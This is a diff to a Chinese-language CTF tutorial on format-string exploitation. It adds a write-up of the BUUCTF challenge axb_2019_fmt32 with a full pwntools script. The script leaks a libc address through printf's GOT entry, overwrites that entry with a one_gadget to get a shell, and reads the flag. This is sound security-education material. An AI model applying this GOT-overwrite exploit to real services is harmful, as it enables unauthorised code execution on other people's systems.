@@ -1181,6 +1181,8 @@ printf 会先去掏这几个寄存器，寄存器掏空了，再顺着栈往下�
 * `%hn`：一次只往内存里写 2 个字节（最多打印 65535 个字符，瞬间跑完）。
 * `%hhn`：一次只往内存里写 1 个字节（最多打印 255 个字符，速度极快）。
 
+但是，我们通常使用 pwntools 自带的 `fmtstr_payload(8,{printf_got:one_gadget},write_size="byte",numbwritten=0xa)` 工具自动生成，含义为 **在已经输出了 0xa 个字节的前提下，向第 8 个参数槽位指向的地址写入 one_gadget**。
+
 ### Canary 绕过
 
 在 “常见安全保护中”，我们曾提到：
@@ -1426,6 +1428,71 @@ def main():
     shellcode = asm(shellcraft.sh())
     payload = shellcode + (offset - len(shellcode)) * b"A" + p64(canary) + 3 * p64(0x0) + p64(stack_addr - 192)
     io.sendline(payload)
+    io.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+#### 例题 4：axb_2019_fmt32
+
+[BUU CTF 题目链接](https://buuoj.cn/challenges#axb_2019_fmt32)
+
+<img width="2042" height="760" alt="image" src="https://github.com/user-attachments/assets/110a929a-82e8-4b7c-b563-1100dab1acae" />
+
+复读机，有 `printf(format);`，显然 fmt。
+
+`sprintf(format, "Repeater:%s\n", s);` 会把 s 填到 %s 上，然后赋值给 format。
+
+比如输入一个 hello，那么 format 就会等于 Repeater:hello\n。
+
+所以通过 sprintf，我们可以实现向 format 的任意读写（但是不能栈溢出，因为没有 ret，s 还限制了读入长度）
+
+因为没有 ret，是死循环程序，所以栈溢出被堵死，只能考虑 got 表覆写，通过第一次泄露 libc，第二次向 printf_got 或者 read_got 覆写 system 或者 one_gadget。
+
+<img width="1100" height="794" alt="05aad958e58fbdd0eb09940b66afca63" src="https://github.com/user-attachments/assets/1edbf502-dd21-44ed-a558-c788e1876d4f" />
+
+偏移量是 8.
+
+```
+# written by Sonnety
+from pwn import *
+context(os = 'linux',arch = 'i386',log_level = 'debug')
+context.terminal = ['tmux', 'splitw', '-h']
+
+host = "node5.buuoj.cn"
+port = 27434
+io = remote(host,port)
+# io = process("./axb_2019_fmt32")
+elf = ELF("./axb_2019_fmt32")
+libc = ELF("./libc-2.23.so")
+printf_got = elf.got['printf']
+
+def main():
+    io.recvuntil(b"So I'll answer whatever you say!\n")
+    print("\n[+] Leak printf GOT address :",hex(printf_got))
+    io.recvuntil(b"Please tell me:")
+    payload = b'A' + p32(printf_got) + b"%8$s"
+    io.sendline(payload)
+    io.recvuntil(b"Repeater:A" + p32(printf_got))
+    leak_data = io.recv(4)
+    printf_addr = u32(leak_data)
+    print("\n[+] Leak printf address :",hex(printf_addr))
+    libc_base = printf_addr - libc.sym['printf']
+    print("\n[+] Leak libc base address :",hex(libc_base))
+    system = libc_base + libc.sym['system']
+    print("\n[+] Leak system address :",hex(system))
+    one_gadget_offset = 0x3a812
+    one_gadget = libc_base + one_gadget_offset
+    print("\n[+] Leak One gagdet address",one_gadget)
+    io.recvuntil(b"Please tell me:") 
+    payload = b'A' + fmtstr_payload(8,{printf_got:one_gadget},write_size="byte",numbwritten=0xa)
+    # payload = b'A' + fmtstr_payload(8,{printf_got:system},write_size="byte",numbwritten=0xa)
+    io.sendline(payload)
+    sleep(0.01)
+    # io.sendline(b";/bin/sh")
+    # sleep(0.01)
+    io.sendline(b"cat flag")
     io.interactive()
 
 if __name__ == "__main__":
